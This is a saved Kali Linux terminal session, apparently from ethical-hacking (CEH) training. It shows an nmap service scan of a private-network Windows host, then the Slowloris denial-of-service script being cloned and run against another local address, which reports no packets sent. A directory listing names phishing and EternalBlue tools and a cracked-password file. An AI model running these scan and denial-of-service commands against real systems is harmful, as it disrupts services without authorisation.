@@ -1,0 +1,455 @@
+root@kali:~/Desktop/amit/CEH# top
+
+top - 16:59:08 up 31 min,  1 user,  load average: 0.95, 0.82, 0.75
+Tasks: 216 total,   1 running, 214 sleeping,   0 stopped,   1 zombie
+%Cpu(s):  8.1 us,  3.2 sy,  0.0 ni, 88.4 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st
+MiB Mem :   3921.4 total,   1718.2 free,   1179.8 used,   1023.4 buff/cache
+MiB Swap:   3982.0 total,   3982.0 free,      0.0 used.   2146.8 avail Mem 
+
+  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                    
+ 1997 root      20   0 1362504 201336  71176 S  18.6   5.0   1:49.20 gnome-shell                                                                                                
+ 1893 root      20   0  150636  84128  68440 S   7.0   2.1   0:34.89 Xorg                                                                                                       
+ 2838 root      20   0  135640  37764  27104 S   6.0   0.9   0:01.61 gnome-terminal-                                                                                            
+ 2926 root      20   0 1275872 340212 103408 S   0.7   8.5   2:27.45 firefox-esr                                                                                                
+    1 root      20   0   31600   8156   6528 S   0.3   0.2   0:03.68 systemd                                                                                                    
+ 2861 root      20   0  256652  92856  36444 S   0.3   2.3   0:10.30 nautilus                                                                                                   
+ 3085 root      20   0       0      0      0 I   0.3   0.0   0:00.11 kworker/0:2                                                                                                
+ 3347 root      20   0       0      0      0 I   0.3   0.0   0:00.04 kworker/2:0                                                                                                
+ 3444 root      20   0       0      0      0 D   0.3   0.0   0:00.10 kworker/u8:2                                                                                               
+    2 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kthreadd                                                                                                   
+    3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp                                                                                                     
+    5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/0:0H                                                                                               
+    7 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 mm_percpu_wq                                                                                               
+    8 root      20   0       0      0      0 S   0.0   0.0   0:00.09 ksoftirqd/0                                                                                                
+    9 root      20   0       0      0      0 I   0.0   0.0   0:01.06 rcu_sched                                                                                                  
+   10 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_bh                                                                                                     
+   11 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 migration/0                                                                                                
+   12 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 watchdog/0                                                                                                 
+   13 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/0                                                                                                    
+   14 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/1                                                                                                    
+   15 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 watchdog/1                                                                                                 
+   16 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 migration/1                                                                                                
+   17 root      20   0       0      0      0 S   0.0   0.0   0:00.10 ksoftirqd/1                                                                                                
+   19 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/1:0H                                                                                               
+   20 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/2                                                                                                    
+   21 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 watchdog/2                                                                                                 
+   22 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 migration/2                                                                                                
+   23 root      20   0       0      0      0 S   0.0   0.0   0:00.07 ksoftirqd/2                                                                                                
+   25 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/2:0H                                                                                               
+   26 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/3                                                                                                    
+   27 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 watchdog/3                                                                                                 
+   28 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 migration/3                                                                                                
+   29 root      20   0       0      0      0 S   0.0   0.0   0:00.05 ksoftirqd/3                                                                                                
+   31 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/3:0H                                                                                               
+   32 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kdevtmpfs                                                                                                  
+   33 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 netns                                                                                                      
+root@kali:~/Desktop/amit/CEH# nmap -vv -T5 -sV 192.168.1.70
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 17:12 IST
+NSE: Loaded 43 scripts for scanning.
+Initiating ARP Ping Scan at 17:12
+Scanning 192.168.1.70 [1 port]
+Completed ARP Ping Scan at 17:12, 0.12s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 17:12
+Completed Parallel DNS resolution of 1 host. at 17:12, 0.02s elapsed
+Initiating SYN Stealth Scan at 17:12
+Scanning 192.168.1.70 [1000 ports]
+Discovered open port 21/tcp on 192.168.1.70
+Discovered open port 135/tcp on 192.168.1.70
+Discovered open port 139/tcp on 192.168.1.70
+Discovered open port 445/tcp on 192.168.1.70
+Discovered open port 49156/tcp on 192.168.1.70
+Discovered open port 49155/tcp on 192.168.1.70
+Discovered open port 49152/tcp on 192.168.1.70
+Discovered open port 49154/tcp on 192.168.1.70
+Increasing send delay for 192.168.1.70 from 0 to 5 due to 273 out of 681 dropped probes since last increase.
+Warning: 192.168.1.70 giving up on port because retransmission cap hit (2).
+Discovered open port 49153/tcp on 192.168.1.70
+Discovered open port 5357/tcp on 192.168.1.70
+Discovered open port 49157/tcp on 192.168.1.70
+Completed SYN Stealth Scan at 17:12, 8.01s elapsed (1000 total ports)
+Initiating Service scan at 17:12
+Scanning 11 services on 192.168.1.70
+Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 27.27% done; ETC: 17:12 (0:00:16 remaining)
+Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 36.36% done; ETC: 17:12 (0:00:19 remaining)
+Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 45.45% done; ETC: 17:13 (0:00:19 remaining)
+Service scan Timing: About 54.55% done; ETC: 17:14 (0:00:46 remaining)
+Completed Service scan at 17:13, 63.21s elapsed (11 services on 1 host)
+NSE: Script scanning 192.168.1.70.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 17:13
+Completed NSE at 17:13, 0.06s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 17:13
+Completed NSE at 17:13, 0.02s elapsed
+Nmap scan report for 192.168.1.70
+Host is up, received arp-response (0.15s latency).
+Scanned at 2019-07-28 17:12:17 IST for 72s
+Not shown: 988 closed ports
+Reason: 988 resets
+PORT      STATE    SERVICE      REASON          VERSION
+21/tcp    open     ftp          syn-ack ttl 128 FileZilla ftpd 0.9.41 beta
+135/tcp   open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open     netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
+445/tcp   open     microsoft-ds syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+4446/tcp  filtered n1-fwp       no-response
+5357/tcp  open     http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49152/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49153/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49154/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49155/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49156/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+49157/tcp open     msrpc        syn-ack ttl 128 Microsoft Windows RPC
+MAC Address: 60:30:D4:81:A1:60 (Unknown)
+Service Info: Host: VIC-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.62 seconds
+           Raw packets sent: 1688 (74.256KB) | Rcvd: 1058 (42.352KB)
+root@kali:~/Desktop/amit/CEH# cd ..
+root@kali:~/Desktop/amit# cd ..
+root@kali:~/Desktop# cd ..
+root@kali:~# cd D
+bash: cd: D: No such file or directory
+root@kali:~# cd Desktop/
+root@kali:~/Desktop# git clone https://github.com/llaera/slowloris.pl
+Cloning into 'slowloris.pl'...
+remote: Enumerating objects: 15, done.
+remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
+Unpacking objects: 100% (15/15), done.
+root@kali:~/Desktop# ls
+amit  slowloris.pl  small.txt  start-tor-browser.desktop
+root@kali:~/Desktop# cd slowloris.pl/
+root@kali:~/Desktop/slowloris.pl# ls
+README  slowloris.pl
+root@kali:~/Desktop/slowloris.pl# cd ..
+root@kali:~/Desktop# chmod +x slowloris.pl/
+root@kali:~/Desktop# ls
+amit  slowloris.pl  small.txt  start-tor-browser.desktop
+root@kali:~/Desktop# cd ..
+root@kali:~# git clone https://github.com/llaera/slowloris.pl
+fatal: destination path 'slowloris.pl' already exists and is not an empty directory.
+root@kali:~# ls -l
+total 27708
+-rw-r--r-- 1 root root    18515 Jul  1 16:58 0107Notes
+drwxr-xr-x 3 root root     4096 May 23 14:01 123
+drwxr-xr-x 2 root root     4096 Jul 15 09:13 47119
+-rw-r--r-- 1 root root     8423 Jul  6 16:12 AliveIps.txt
+-rw-r--r-- 1 root root       18 Jun 17 16:39 amreet.txt
+drwxr-xr-x 2 root root     4096 Jul 27 12:40 Asif
+-rw-r--r-- 1 root root       18 Jul 13 17:54 atm.txt
+drwxr-xr-x 2 root root     4096 Jul 13 15:34 Avinash
+-rw-r--r-- 1 root root       11 Jul 13 18:11 Avinash_cracked_password.txt
+drwxr-xr-x 4 root root     4096 Jul  9 19:34 blackeye
+-rw-r--r-- 1 root root     3246 Jul 20 16:22 day_7_Avinash
+drwxr-xr-x 4 root root     4096 Jul 28 17:23 Desktop
+-rw-r--r-- 1 root root     4710 Jul 17 16:35 Desktop.gnmap
+-rw-r--r-- 1 root root     1455 Jul 17 16:35 Desktop.nmap
+-rw-r--r-- 1 root root     8622 Jul 17 16:35 Desktop.xml
+drwxr-xr-x 2 root root     4096 Apr 21 00:52 Documents
+drwxr-xr-x 3 root root     4096 Jul 28 13:32 Downloads
+-rw-r--r-- 1 root root   377902 May 25 15:36 driftnet-0.jpeg
+-rw-r--r-- 1 root root   123913 Jul 21 17:28 driftnet-10.jpeg
+-rw-r--r-- 1 root root   377902 May 25 15:36 driftnet-1.jpeg
+-rw-r--r-- 1 root root   377902 May 25 15:36 driftnet-2.jpeg
+-rw-r--r-- 1 root root   377902 May 25 15:36 driftnet-3.jpeg
+-rw-r--r-- 1 root root   203945 Jul 21 17:28 driftnet-4.jpeg
+-rw-r--r-- 1 root root   203945 Jul 21 17:28 driftnet-5.jpeg
+-rw-r--r-- 1 root root   203945 Jul 21 17:28 driftnet-6.jpeg
+-rw-r--r-- 1 root root   123913 Jul 21 17:28 driftnet-7.jpeg
+-rw-r--r-- 1 root root   123913 Jul 21 17:28 driftnet-8.jpeg
+-rw-r--r-- 1 root root   156577 Jul 21 17:28 driftnet-9.jpeg
+drwxr-xr-x 4 root root     4096 May 12 16:31 Eternalblue-Doublepulsar-Metasploit
+-rw-r--r-- 1 root root      613 Jul 15 20:17 fimap.log
+-rw-r--r-- 1 root root     6205 Jul 15 20:17 fimap_result.xml
+-rw-r--r-- 1 root root    87178 May 12 15:41 gKxrKJUl.jpeg
+drwxr-xr-x 9 root root     4096 Jul  9 20:25 HiddenEye
+-rw-r--r-- 1 root root        6 May 11 15:10 hi.txt
+-rw-r--r-- 1 root root    61011 Jul  3 19:28 IOatrdRq.jpeg
+-rw-r--r-- 1 root root        0 May 11 15:24 jj.txt
+-rw-r--r-- 1 root root       28 Jul 25 18:50 jp-secret.txt
+drwxr-xr-x 2 root root     4096 May  6 16:16 K
+drwxr-xr-x 2 root root     4096 May  7 13:32 Kanthi
+drwxr-xr-x 3 root root     4096 Jul  4 18:44 LinEnum
+drwxr-xr-x 3 root root     4096 May 15 14:12 linux-exploit-suggester
+-rw-r--r-- 1 root root        9 Jul  1 18:46 lovequote.txt
+drwxr-xr-x 3 root root     4096 Jul 15 09:14 __MACOSX
+-rw-r--r-- 1 root root       30 Jul  2 19:00 mobile.txt
+drwxr-xr-x 2 root root     4096 May  6 16:20 Mohan
+drwxr-xr-x 2 root root     4096 Apr 21 00:52 Music
+-rw-r--r-- 1 root root    50252 Jul 23 13:58 MXdQRNWt.jpeg
+-rw-r--r-- 1 root root      452 Jun 13 16:30 Nik.txt
+drwxr-xr-x 4 root root     4096 May  5 18:10 nmap-vulners
+-rw-r--r-- 1 root root     1768 Jun  1 11:49 output.txt
+-rw-r--r-- 1 root root     1801 Jul 18 19:43 owasp_zap_root_ca.cer
+-rw-r--r-- 1 root root   114191 Jul 13 17:54 pGslesUZ.jpeg
+drwxr-xr-x 2 root root     4096 Jul  6 15:06 Pictures
+drwxr-xr-x 2 root root     4096 Jun 24 19:51 pooja
+drwxr-xr-x 2 root root     4096 Jun 24 19:54 Pooja
+drwxr-xr-x 2 root root     4096 Apr 21 00:52 Public
+-rw-r--r-- 1 root root       26 Apr 28 13:04 script1.html
+-rw-r--r-- 1 root root       29 May 19 13:01 secret.txt
+drwxr-xr-x 4 root root     4096 Jul 27 17:11 shellphish
+drwxr-xr-x 2 root root     4096 May  4 17:06 Shikha
+-rw-r--r-- 1 root root        5 May 11 15:32 shkha.txt
+drwxr-xr-x 3 root root     4096 May 21 16:21 slowloris.pl
+drwxr-xr-x 2 root root     4096 Jun 10 15:53 sneha
+drwxr-xr-x 2 root root     4096 Jun 10 15:51 Sneha
+-rw-r--r-- 1 root root       24 Jul 13 17:57 something2.txt
+drwxr-xr-x 2 root root     4096 Jun 29 16:45 soumya
+drwxr-xr-x 2 root root     4096 Jun 29 16:45 Soumya
+-rw-r--r-- 1 root root 23289702 Jul 21 18:03 sslstrip.log
+-rw-r--r-- 1 root root     8192 Jun 26 18:31 stash.sqlite
+drwxr-xr-x 2 root root     4096 Apr 21 00:52 Templates
+drwxr-xr-x 2 root root     4096 Jun 24 16:00 test
+drwxr-xr-x 3 root root     4096 Apr 28 10:16 test1
+-rw-r--r-- 1 root root      285 Jul 14 14:38 trptalenthub.com
+-rw-r--r-- 1 root root  1531904 Jun  1 13:16 typescript
+-rw-r--r-- 1 root root    83851 Jul  2 19:11 uwoViMKt.jpeg
+drwxr-xr-x 2 root root     4096 Jul 13 10:44 Videos
+-rw-r--r-- 1 root root    81961 Jul  2 19:08 XsFyPRIL.jpeg
+-rw-r--r-- 1 root root    96570 Jul  2 18:59 YnDAQuys.jpeg
+root@kali:~# chmod +x slowloris.pl/
+root@kali:~# perl slowloris.pl/
+Can't open perl script "slowloris.pl/": Is a directory
+root@kali:~# perl slowloris.pl 
+Can't open perl script "slowloris.pl": Is a directory
+root@kali:~# perl slowloris.pl
+Can't open perl script "slowloris.pl": Is a directory
+root@kali:~# cd D
+bash: cd: D: No such file or directory
+root@kali:~# cd Desktop/
+root@kali:~/Desktop# perl slowloris.pl
+Can't open perl script "slowloris.pl": Is a directory
+root@kali:~/Desktop# cd slowloris.pl/
+root@kali:~/Desktop/slowloris.pl# perl slowloris.pl
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Usage:
+
+	perl slowloris.pl -dns [www.example.com] -options
+
+	Type 'perldoc slowloris.pl' for help with options.
+
+root@kali:~/Desktop/slowloris.pl# perl slowloris.pl -d 192.168.1.72
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Defaulting to port 80.
+Defaulting to a 5 second tcp connection timeout.
+Defaulting to a 100 second re-try timeout.
+Defaulting to 1000 connections.
+Multithreading enabled.
+Connecting to 192.168.1.72:80 every 100 seconds with 1000 sockets:
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+^Z
+[1]+  Stopped                 perl slowloris.pl -d 192.168.1.72
+root@kali:~/Desktop/slowloris.pl# perl slowloris.pl -dns 192.168.1.72
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+Defaulting to port 80.
+Defaulting to a 5 second tcp connection timeout.
+Defaulting to a 100 second re-try timeout.
+Defaulting to 1000 connections.
+Multithreading enabled.
+Connecting to 192.168.1.72:80 every 100 seconds with 1000 sockets:
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Building sockets.
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+		Sending data.
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+		Sending data.
+Current stats:	Slowloris has now sent 0 packets successfully.
+This thread now sleeping for 100 seconds...
+
+
+
